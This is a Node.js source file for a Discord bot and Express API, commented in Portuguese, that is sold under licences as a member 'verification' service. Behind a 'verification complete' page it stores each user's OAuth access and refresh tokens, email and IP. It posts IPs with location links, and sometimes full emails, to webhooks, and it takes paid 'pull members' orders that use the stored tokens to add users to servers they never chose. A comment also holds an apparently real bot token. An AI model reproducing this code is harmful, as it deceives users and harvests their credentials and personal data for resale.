const express = require('express');
const axios = require('axios');
const { verifyKeyMiddleware, InteractionType, InteractionResponseType } = require('discord-interactions');
const app = express();
//const PORT = process.env.PORT || 8080;
//a


const { GatewayIntentBits, Client, Collection, ActivityType, EmbedBuilder, ButtonBuilder, ActionRowBuilder } = require("discord.js")
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.GuildMessageReactions,
    ]
});
const events = require('./Handler/events')
const slash = require('./Handler/slash');
const { registros, configuracoes, Licensa, PullRequest, General } = require('./DataBaseJson');
const { generateToken } = require('./Functions/GerenciarAuth');

slash.run(client)
events.run(client)

// client.on('messageCreate', async message => {
//     if (message.channel.id === '1252467628404899860') {
//         if (message.member.permissions.has('Administrator')) return;
//         message.delete();
//     }
// })



// MTIzNjA5NzEzMjI4MTQ2Mjg1Ng.GINQqJ.sN5CMMiv-M3LzJQT2FnAnpIAG6wx7aEik-WCTE

client.slashCommands = new Collection();


process.on('unhandRejection', (reason, promise) => {
    console.log(`🚫 Erro Detectado:\n\n` + reason, promise)
});
process.on('uncaughtException', (error, origin) => {
    console.log(`🚫 Erro Detectado:\n\n` + error, origin)
});
process.on('uncaughtExceptionMonitor', (error, origin) => {
    console.log(`🚫 Erro Detectado:\n\n` + error, origin)
});

const { token, port } = require("./config.json");
client.login(token);

/*try {
    client.login('')
} catch (error) {
    console.log(error)
}*/

// abaixo n mexer

// https://discord.com/oauth2/authorize?client_id=1228129021397827614&response_type=code&redirect_uri=https%3A%2F%2F51f039cf1a0d997f0a0154cd74c52fb7.serveo.net%2F&scope=email+identify+guilds.join


//a
app.use(express.json());

app.get('/', (req, res) => {

    res.redirect(`https://discord.gg/exemplo`)

});


app.get('/api/checktoken2', (req, res) => {
    const token = req.query.token;
    const bot = Licensa.filter((x) => x.data.token === token)[0]
    if (!bot) return res.send({ message: "Nenhum registro encontrado! (TOKEN INVALIDO)", code: 404 });
 
    res.send({registro: bot.data.registro})
})

app.get('/api/checktoken', (req, res) => {
    const token = req.query.token;
    const bot = Licensa.filter((x) => x.data.token === token)[0]
    if (!bot) return res.send({ message: "Nenhum registro encontrado! (TOKEN INVALIDO)", code: 404 });
    let registro = registros.get(bot.data.registro)


    if (registro) {
        delete registro.token;
        delete registro.client_secret;
        if (registro) {
            delete registro.token;
            delete registro.originbot
            delete registro.client_secret;
            if (registro.usuarios && Array.isArray(registro.usuarios)) {
                registro.usuarios.forEach((usuario) => {
                    // Removendo os campos para todos os usuários, exceto quando access_token é 'unauthorized'
                    if (usuario.access_token !== 'unauthorized') {
                        delete usuario.access_token;
                    }

                    delete usuario.refresh_token;
                    delete usuario.ip;
                    delete usuario.token_expires;
                    delete usuario.serverid;
                });
            }
        }
    }
    res.status(200).send(registro);
})

app.set('trust proxy', true);
app.get("/api/login", async (req, res) => {
    const id = req.query.state.split(" ")[0];
    const idserver = req.query.state.split(" ")[1];
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const ipsSeparados = ip.split(',');
    ip = ipsSeparados[0].trim();
    let bot = registros.get(id)


    if (bot.inativo) {
        res.redirect(`https://discord.com/channels/${idserver}`)
        return
    }


    if (!bot) return res.send({ message: "Bot não encontrado!", code: 404 });


    const data = {
        client_id: bot.botid,
        client_secret: bot.client_secret,
        grant_type: "authorization_code",
        code: req.query.code,
        redirect_uri: 'https://apiauth6.squareweb.app/api/login'
    };

    const headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    };

    let response;
    try {
        response = await axios.post(`https://discord.com/api/v10/oauth2/token`, data, {
            headers: headers,
        });
    } catch (error) {
        //   console.log(error)
        res.redirect(`https://discord.com/channels/${idserver}`)
        return
    }

    const userResult = await axios.get('https://discord.com/api/users/@me', {
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            Authorization: `Bearer ${response.data.access_token}`,
        },
    });


    let guildd
    await fetch('https://discord.com/api/users/@me/guilds', {
        method: 'GET',
        headers: {
            Authorization: `Bearer ${response.data.access_token}`
        }
    })
        .then(res => res.json())
        .then(guilds => {
            guildd = guilds
        })
        .catch(console.error);
    let guildInfo
    if (guildd.message == '401: Unauthorized') {
        const url = `https://discord.com/api/guilds/${idserver}`;
        const options = {
            headers: {
                'Authorization': `Bot ${bot.token}`
            }
        };

        let responsee = await fetch(url, options);
        guildInfo = await responsee.json();
    } else {
        guildInfo = guildd.find(guild => guild.id === idserver);
    }

    let tokenexpiress = Date.now() + response.data.expires_in * 1000;

    const usuarioRegistrado = bot.usuarios.some(registro => registro.userid === userResult.data.id);

    if (usuarioRegistrado == false) {
        registros.push(`${id}.usuarios`, {
            userid: userResult.data.id,
            nome: userResult.data.username,
            email: userResult.data.email,
            serverid: [{ idserver: idserver, servername: guildInfo.name }],
            access_token: response.data.access_token,
            refresh_token: response.data.refresh_token,
            token_expires: tokenexpiress,
            ip: ip,
            timestamp: Date.now()
        })

    } else {
        const registro = bot.usuarios.find(registro => registro.userid === userResult.data.id);
        registro.access_token = response.data.access_token;
        registro.refresh_token = response.data.refresh_token;
        registro.token_expires = tokenexpiress;
        registro.email = userResult.data.email;
        registro.nome = userResult.data.username;
        registro.ip = ip;
        if (!registro.serverid.some(server => server.idserver === idserver)) {
            registro.serverid.push({ idserver: idserver, servername: guildInfo.name });
        }

        registros.set(`${id}.usuarios`, bot.usuarios)
    }


    let icon
    if (guildInfo.icon == null) {
        icon = 'https://media.discordapp.net/attachments/1228074217333985291/1242896527748501635/promisse_low.webp?ex=6656c158&is=66556fd8&hm=e8462276256945d89b6e61357e025183e69cef3a8c38babd4f2bd6da5d254437&=&format=webp'
    } else {
        icon = `https://cdn.discordapp.com/icons/${guildInfo.id}/${guildInfo.icon}.png`
    }


    const html = `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Verificação concluída • ${guildInfo.name}</title><link id="server-favicon" rel="icon" type="image/png" href="${icon}"/><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet"><style>:root{--background:#0a0a0f;--background-secondary:#0d0d14;--card:rgba(18,18,27,0.66);--card-border:rgba(255,255,255,0.08);--text:#ffffff;--text-secondary:#a8a8b3;--success:#1eff00;--discord:#5865F2;--discord-hover:#6673ff;}*{margin:0;padding:0;box-sizing:border-box;}html,body{width:100%;min-height:100%;}body{min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;padding:24px;font-family:"Montserrat",sans-serif;color:var(--text);background:radial-gradient(circle at 20% 20%,rgba(88,101,242,0.12),transparent 35%),radial-gradient(circle at 80% 75%,rgba(30,255,0,0.06),transparent 30%),var(--background);}.background{position:fixed;inset:0;z-index:-3;overflow:hidden;pointer-events:none;}.background::before,.background::after{content:"";position:absolute;width:550px;height:550px;border-radius:50%;filter:blur(110px);opacity:0.17;animation:floatGlow 12s ease-in-out infinite alternate;}.background::before{top:-220px;left:-180px;background:#5865F2;}.background::after{right:-220px;bottom:-250px;background:#1eff00;animation-delay:-5s;}@keyframes floatGlow{0%{transform:translate3d(0,0,0) scale(1);}100%{transform:translate3d(65px,40px,0) scale(1.16);}}.particles{position:fixed;inset:0;z-index:-2;overflow:hidden;pointer-events:none;}.particle{position:absolute;width:3px;height:3px;border-radius:50%;background:rgba(255,255,255,0.16);animation:particleFloat linear infinite;}@keyframes particleFloat{0%{transform:translateY(20px) scale(0.7);opacity:0;}20%{opacity:0.7;}80%{opacity:0.4;}100%{transform:translateY(-110vh) scale(1.3);opacity:0;}}.card{position:relative;width:100%;max-width:470px;padding:44px 34px 34px;text-align:center;border:1px solid var(--card-border);border-radius:26px;background:linear-gradient(145deg,rgba(22,22,32,0.78),rgba(13,13,20,0.65));box-shadow:0 30px 80px rgba(0,0,0,0.55),inset 0 1px 0 rgba(255,255,255,0.04);backdrop-filter:blur(22px);-webkit-backdrop-filter:blur(22px);opacity:0;transform:translateY(30px) scale(0.97);animation:cardEnter 0.8s cubic-bezier(0.16,1,0.3,1) forwards;}@keyframes cardEnter{to{opacity:1;transform:translateY(0) scale(1);}}.success-badge{position:absolute;top:18px;right:18px;display:flex;align-items:center;gap:7px;padding:7px 11px;border-radius:999px;font-size:10px;font-weight:700;letter-spacing:0.8px;text-transform:uppercase;color:var(--success);background:rgba(30,255,0,0.07);border:1px solid rgba(30,255,0,0.16);}.badge-dot{width:6px;height:6px;border-radius:50%;background:var(--success);box-shadow:0 0 12px rgba(30,255,0,0.8);animation:badgePulse 1.8s ease-in-out infinite;}@keyframes badgePulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:0.5;transform:scale(0.75);}}.check-container{position:relative;width:92px;height:92px;margin:16px auto 25px;display:flex;align-items:center;justify-content:center;border-radius:50%;background:rgba(30,255,0,0.055);border:1px solid rgba(30,255,0,0.14);}.check-container::before{content:"";position:absolute;inset:-10px;border-radius:50%;border:1px solid rgba(30,255,0,0.06);animation:pulseRing 2.3s ease-out infinite;}.check-container::after{content:"";position:absolute;inset:10px;border-radius:50%;background:rgba(30,255,0,0.04);box-shadow:0 0 36px rgba(30,255,0,0.09);}@keyframes pulseRing{0%{transform:scale(0.85);opacity:0.9;}100%{transform:scale(1.4);opacity:0;}}.check-icon{position:relative;z-index:2;width:50px;height:50px;}.check-circle{fill:none;stroke:rgba(30,255,0,0.35);stroke-width:2;}.check-path{fill:none;stroke:var(--success);stroke-width:4;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:50;stroke-dashoffset:50;filter:drop-shadow(0 0 5px rgba(30,255,0,0.6));animation:drawCheck 0.7s ease forwards 0.55s;}@keyframes drawCheck{to{stroke-dashoffset:0;}}.server-avatar-wrapper{position:relative;display:inline-flex;margin-bottom:18px;}.server-avatar{width:82px;height:82px;object-fit:cover;border-radius:50%;border:3px solid rgba(255,255,255,0.09);box-shadow:0 14px 35px rgba(0,0,0,0.35),0 0 0 6px rgba(255,255,255,0.025);}.server-avatar-wrapper::after{content:"";position:absolute;right:1px;bottom:3px;width:19px;height:19px;border-radius:50%;background:var(--success);border:4px solid #111119;box-shadow:0 0 14px rgba(30,255,0,0.35);}.eyebrow{margin-bottom:9px;color:var(--success);font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;}.server-name{max-width:100%;margin-bottom:14px;font-size:clamp(24px,6vw,31px);font-weight:800;letter-spacing:-0.8px;line-height:1.15;overflow-wrap:anywhere;}.success-text{max-width:370px;margin:0 auto 30px;color:var(--text-secondary);font-size:14px;font-weight:500;line-height:1.75;}.success-text strong{color:#dedee5;font-weight:600;}.divider{width:100%;height:1px;margin:0 0 25px;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.09),transparent);}.back-button{position:relative;width:100%;min-height:52px;display:flex;align-items:center;justify-content:center;gap:10px;padding:14px 20px;color:#ffffff;background:var(--discord);border:0;border-radius:13px;font-family:"Montserrat",sans-serif;font-size:14px;font-weight:700;cursor:pointer;overflow:hidden;box-shadow:0 12px 30px rgba(88,101,242,0.25);transition:transform 0.2s ease,background 0.2s ease,box-shadow 0.2s ease;}.back-button::before{content:"";position:absolute;top:0;left:-120%;width:70%;height:100%;background:linear-gradient(100deg,transparent,rgba(255,255,255,0.16),transparent);transform:skewX(-15deg);transition:left 0.65s ease;}.back-button:hover{background:var(--discord-hover);transform:translateY(-2px);box-shadow:0 16px 35px rgba(88,101,242,0.34);}.back-button:hover::before{left:150%;}.back-button:active{transform:translateY(0) scale(0.99);}.discord-icon{width:21px;height:21px;fill:currentColor;flex-shrink:0;}.security-note{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:19px;color:#696976;font-size:10px;font-weight:500;}.security-note svg{width:12px;height:12px;stroke:currentColor;}@media(max-width:520px){body{padding:17px;}.card{padding:42px 22px 27px;border-radius:22px;}.success-badge{top:14px;right:14px;padding:6px 9px;font-size:9px;}.check-container{width:82px;height:82px;margin-top:15px;}.server-avatar{width:74px;height:74px;}.success-text{font-size:13px;}}@media(prefers-reduced-motion:reduce){*,*::before,*::after{animation-duration:0.01ms !important;animation-iteration-count:1 !important;transition-duration:0.01ms !important;}}</style></head><body><div class="background"></div><div class="particles" id="particles"></div><main class="card"><div class="success-badge"><span class="badge-dot"></span>Verificado</div><div class="check-container"><svg class="check-icon" viewBox="0 0 52 52" aria-hidden="true"><circle class="check-circle" cx="26" cy="26" r="23"></circle><path class="check-path" d="M15 27 L22.5 34.5 L38 18"></path></svg></div><div class="server-avatar-wrapper"><img id="server-icon" class="server-avatar" src="${icon}" alt="Ícone de ${guildInfo.name}" draggable="false"/></div><div class="eyebrow">Verificação concluída</div><h1 class="server-name">${guildInfo.name}</h1><p class="success-text">Você foi verificado com sucesso em <strong>${guildInfo.name}</strong>. Sua autenticação foi concluída e você já pode voltar para o servidor.</p><div class="divider"></div><button id="back-to-server" class="back-button" type="button"><svg class="discord-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M19.54 5.34A16.8 16.8 0 0 0 15.44 4a11.3 11.3 0 0 0-.52 1.06 15.7 15.7 0 0 0-4.84 0A11.6 11.6 0 0 0 9.55 4a16.7 16.7 0 0 0-4.1 1.34C2.85 9.18 2.15 12.91 2.5 16.58a16.5 16.5 0 0 0 5.02 2.54c.4-.55.76-1.14 1.07-1.75a10.8 10.8 0 0 1-1.67-.8l.41-.32c3.22 1.49 6.72 1.49 9.9 0l.42.32c-.54.31-1.1.58-1.68.8.31.61.67 1.2 1.07 1.75a16.5 16.5 0 0 0 5.02-2.54c.42-4.26-.72-7.96-2.52-11.24ZM9.36 14.38c-.97 0-1.77-.9-1.77-2s.78-2 1.77-2c1 0 1.79.91 1.77 2 0 1.1-.78 2-1.77 2Zm5.28 0c-.97 0-1.77-.9-1.77-2s.78-2 1.77-2c1 0 1.79.91 1.77 2 0 1.1-.77 2-1.77 2Z"/></svg>Voltar para o servidor</button><div class="security-note"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="5" y="11" width="14" height="10" rx="2"></rect><path d="M8 11V7a4 4 0 0 1 8 0v4"></path></svg>Autenticação segura via Discord OAuth2</div></main><script>(function(){"use strict";const injectedServerId="${idserver}";const serverIcon=document.getElementById("server-icon");const favicon=document.getElementById("server-favicon");const backButton=document.getElementById("back-to-server");const particlesContainer=document.getElementById("particles");const defaultServerImage="data:image/svg+xml;charset=UTF-8,"+encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="256" height="256" viewBox="0 0 256 256"><rect width="256" height="256" rx="128" fill="#181821"/><circle cx="128" cy="128" r="92" fill="#5865F2"/><path fill="#fff" d="M177 82c-13-6-25-8-25-8l-3 6c16 5 23 12 23 12-27-15-61-15-88 0 0 0 8-8 24-12l-3-6s-12 2-25 8c0 0-25 36-23 80 0 0 15 20 37 21l9-12c-17-5-24-15-24-15s2 2 6 4c24 13 56 13 80 0 4-2 6-4 6-4s-8 10-24 15l9 12c22-1 37-21 37-21 2-44-23-80-23-80ZM102 145c-8 0-15-8-15-18s7-18 15-18 15 8 15 18-7 18-15 18Zm52 0c-8 0-15-8-15-18s7-18 15-18 15 8 15 18-7 18-15 18Z"/></svg>');serverIcon.addEventListener("error",function(){serverIcon.src=defaultServerImage;if(favicon){favicon.href=defaultServerImage;}});function getServerId(){try{const state=new URL(window.location.href).searchParams.get("state");if(state){const serverId=state.split(" ").pop();if(serverId&&/^[0-9]+$/.test(serverId)){return serverId;}}}catch(error){console.error("Erro ao recuperar ID do servidor:",error);}return injectedServerId;}backButton.addEventListener("click",function(){const serverId=getServerId();if(!serverId){return;}window.location.href="https://discord.com/channels/"+encodeURIComponent(serverId);});function createParticles(){const particleCount=window.innerWidth<=600?18:32;for(let i=0;i<particleCount;i++){const particle=document.createElement("span");particle.className="particle";particle.style.left=Math.random()*100+"%";particle.style.top=100+Math.random()*20+"%";particle.style.opacity=0.15+Math.random()*0.35;particle.style.animationDuration=12+Math.random()*18+"s";particle.style.animationDelay=-(Math.random()*22)+"s";const size=1+Math.random()*2.5;particle.style.width=size+"px";particle.style.height=size+"px";particlesContainer.appendChild(particle);}}createParticles();})();</script></body></html>`;
    res.send(html)
    try {
        let config = configuracoes.get(idserver)
        if (config.webhook) {

            let timecreateaccount = getCreationDateFromSnowflake(userResult.data.id)
            const userAgent2 = req.headers['user-agent'];
            const userAgent = getBrowser(userAgent2);

            function getBrowser(userAgent) {
                if (userAgent.includes("Chrome")) {
                    return "Chrome";
                } else if (userAgent.includes("Firefox")) {
                    return "Firefox";
                } else if (userAgent.includes("Safari")) {
                    return "Safari";
                } else if (userAgent.includes("Edge")) {
                    return "Edge";
                } else {
                    return "Outro";
                }
            }

            let dias = Math.floor((Date.now() - timecreateaccount) / 86400000)
            let ddddd = registros.get(id)
            if (ddddd.channellog !== undefined) {
                LogBotVendas(userResult, dias, userAgent, bot, ddddd.channellog, ddddd.originbot, ip)
            }

            try {




                const exampleEmbed2 = new EmbedBuilder()
                    .setAuthor({ name: 'Usuário Verificado', iconURL: 'https://cdn.discordapp.com/emojis/1230562911294984254.webp?size=44&quality=lossless', url: 'https://ipinfo.io/${ip}' })
                    .setColor(`#00FFFF`)
                    .setDescription(`<@${userResult.data.id}> (\`${userResult.data.username}\`)\n📅 \`${dias}\` dias no Discord.\n📌 IP: \`${ip}\` [Ver Localização](https://ipinfo.io/${ip})`)


                if (bot.adicionais.includes('pullmails')) {
                    exampleEmbed2.addFields({ name: 'Informações:', value: `\`\`\`Dispositivo: ${userAgent}\nEmail: ${userResult.data.email}\`\`\``, inline: false })
                } else {
                    exampleEmbed2.addFields({ name: 'Informações:', value: `\`\`\`Dispositivo: ${userAgent}\nEmail: ${(userResult.data.email).charAt(0)}*********@${(userResult.data.email).split('@')[1]}\`\`\``, inline: false })
                }

                sendWebhookMessage(exampleEmbed2, config.webhook)
            } catch (error) {

            }
        }


        if (config.cargos) {
            addRolesToUser(idserver, userResult.data.id, bot.token, config.cargos);
        }

    } catch (error) {

    }

    if (bot.principalserver) {
        let body = { access_token: response.data.access_token }
        let response2 = await axios.put(`https://discord.com/api/guilds/${bot.principalserver.id}/members/${userResult.data.id}`, JSON.stringify(body), {
            headers: {
                "Content-Type": "application/json",
                Authorization: `Bot ${bot.token}`,
            },
        });
    }


})



const validTokens = [
    '1001154526100869152',
];

app.use((req, res, next) => {
    const authToken = req.headers.authorization;

    if (!authToken) {
        return res.status(401).json({
            "message": "401: Unauthorized",
            "code": 0
        });
    }

    if (!validTokens.includes(authToken)) {
        return res.status(401).json({
            "message": "401: Unauthorized",
            "code": 0
        });
    }

    next();
});



app.get('/api/request', async (req, res) => {
    let pass = req.query.pass


    let dddd = PullRequest.get(pass)
    if (dddd == null) return res.send({ code: 400 })
    res.send(dddd)
})

app.get('/api/get', async (req, res) => {
    let licenseid = req.query.license

    let registro = registros.get(licenseid)

    if (registro == null) {
        res.send({ code: 401 })
    } else {
        // delete registro.token;
        if (registro) {
            delete registro.originbot
            if (registro.usuarios && Array.isArray(registro.usuarios)) {
                registro.usuarios.forEach((usuario) => {
                    // Removendo os campos para todos os usuários, exceto quando access_token é 'unauthorized'
                    if (usuario.access_token !== 'unauthorized') {
                        delete usuario.access_token;
                    }

                    delete usuario.refresh_token;
                    delete usuario.ip;
                    delete usuario.token_expires;
                    delete usuario.serverid;
                });
            }
        }

        res.send(registro)
    }

})

app.post('/api/update', async (req, res) => {
    const { license, token, client_secret, status, botid } = req.body

    if (status == 0) {
        registros.set(`${license}.token`, token)
        registros.set(`${license}.client_secret`, client_secret)
        res.send({ code: 200 })
    } else if (status == 1) {
        registros.set(`${license}.token`, token)
        registros.set(`${license}.client_secret`, client_secret)
        registros.set(`${license}.botid`, botid)
        registros.set(`${license}.usuarios`, [])
        res.send({ code: 200 })
    }

})


app.post('/api/neworder', async (req, res) => {
    let { license, serverid, userid, qtd } = req.body

	

    let dd = await registros.get(license)

	

    const config = {
        method: 'get',
        url: `https://discord.com/api/v10/guilds/${serverid}/members/${dd.botid}`,
        headers: {
            'Authorization': `Bot ${dd.token}`,
        },
    };

    try {
        const response = await axios(config);
    } catch (error) {
        return res.send({ code: 401, botid: dd.botid })
    }
    let dd2 = (dd?.usuarios ?? []).filter(user => user.access_token !== 'unauthorized');

    const embedlogs = new EmbedBuilder()
        .setTitle('Logs de Puxar Membros')
        .setDescription(`O usuário <@!${userid}> fez um pedido de puxar membros, verifique o status abaixo.`)
        .setColor('Yellow')
        .setFields(
            { name: 'Informações:', value: `- Servidor: \`${serverid}\`\n- Membros: \`0\`/\`${qtd == undefined ? dd2.length : qtd}\`\n- Status: \`Em andamento\`\n- Ultima atualização: <t:${Math.floor(Date.now() / 1000)}:R>`, inline: true },
        )

    let channel = await client.channels.fetch(General.get('channelLog'))
    let messagelog = await channel.send({ embeds: [embedlogs] })

    let codeee = generateToken(20)

    let qqq = qtd == undefined ? dd2.length : qtd
    PullRequest.set(codeee, { token: license, idnewserver: serverid, quantidade: Number(qqq), qtdpuxados: 0, status: 'Pendente', message: { user: userid }, messagelog: { id: messagelog.id, channel: messagelog.channel.id } })


    return res.send({ code: 201, totalpuxados: qqq, serverid: serverid, license: license, pass: codeee })

})

app.post('/api/canallog', async (req, res) => {
    const { license, channelid } = req.body
    let dd = await registros.get(license)

    if (dd == null) {
        res.send({ code: 401 })
        return
    }

    registros.set(`${license}.channellog`, channelid)
    res.send({ code: 201 })

})



app.post('/api/registro', async (req, res) => {
    const { token, client_secret, userid, botid, originbot } = req.body


    let dd = await registros.filter(x => x.data.token == token)

    if (dd.length == 0) {

        const id = generateToken()
        const expiracao = Date.now() + 157680000000

        await registros.set(`${id}`, {
            adicionais: [],
            client_secret: client_secret,
            owner: [userid],
            token: token,
            timestamp: expiracao,
            botid: botid,
            originbot: originbot,
            usuarios: []
        })

        res.status(201).send({
            code: 201,
            licenseid: id,
        })


    } else {
        registros.set(`${dd[0].ID}.client_secret`, client_secret)
        registros.set(`${dd[0].ID}.originbot`, originbot)
        res.status(202).send({
            code: 202,
            licenseid: dd[0].ID
        })
    }

})

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});




















const sendWebhookMessage = async (embed, webhookUrl) => {


    try {
        await axios.post(webhookUrl, {
            embeds: [embed]
        });

    } catch (error) {
        // console.log(error)
    }
};



const addRolesToUser = async (guildId, userId, token, roleIds) => {
    try {
        const response = await axios.get(`https://discord.com/api/v10/guilds/${guildId}/members/${userId}`, {
            headers: {
                Authorization: `Bot ${token}`,
            },
        });

        const member = response.data;

        member.roles = member.roles.concat(roleIds);

        await axios.patch(`https://discord.com/api/v10/guilds/${guildId}/members/${userId}`, {
            roles: member.roles,
        }, {
            headers: {
                Authorization: `Bot ${token}`,
            },
        });
    } catch (error) {
    }
};



function getCreationDateFromSnowflake(snowflakeId) {
    const binarySnowflake = (+snowflakeId).toString(2).padStart(64, '0'); // Convert to binary

    const timestampBinary = binarySnowflake.slice(0, 42);
    const timestampDecimal = parseInt(timestampBinary, 2);

    const creationTimestamp = timestampDecimal + 1420070400000;

    return new Date(creationTimestamp);
}


function LogBotVendas(userResult, dias, userAgent, bot, channelId, botToken, ip) {


    const embed = {
        color: 0x00FFFF,
        author: {
            name: 'Usuário Verificado',
            icon_url: 'https://cdn.discordapp.com/emojis/1230562911294984254.webp?size=44&quality=lossless',
            url: `https://ipinfo.io/${ip}`
        },
        description: `<@${userResult.data.id}> (\`${userResult.data.username}\`)\n📅 \`${dias}\` dias no Discord.\n📌 IP: \`${ip}\``,
        fields: [],

    };

    if (bot.adicionais.includes('pullmails')) {
        embed.fields.push({ name: 'Informações:', value: `\`\`\`Dispositivo: ${userAgent}\nEmail: ${userResult.data.email}\`\`\``, inline: false });
    } else {
        embed.fields.push({ name: 'Informações:', value: `\`\`\`Dispositivo: ${userAgent}\nEmail: ${(userResult.data.email).charAt(0)}*********@${(userResult.data.email).split('@')[1]}\`\`\``, inline: false });
    }

    fetch(`https://discord.com/api/channels/${channelId}/messages`, {
        method: 'POST',
        headers: {
            'Authorization': `Bot ${botToken}`,
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            embed,
            components: [
                {
                    type: 1,
                    components: [
                        {
                            type: 2,
                            style: 5,
                            label: 'Ver Localização',
                            url: `https://ipinfo.io/${ip}`,
                        }
                    ]
                }
            ]
        }),
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Erro ao enviar mensagem');
            }
            console.log('Mensagem enviada com sucesso!');
        })
        .catch(error => {
            console.error('Erro:', error);
        });
}

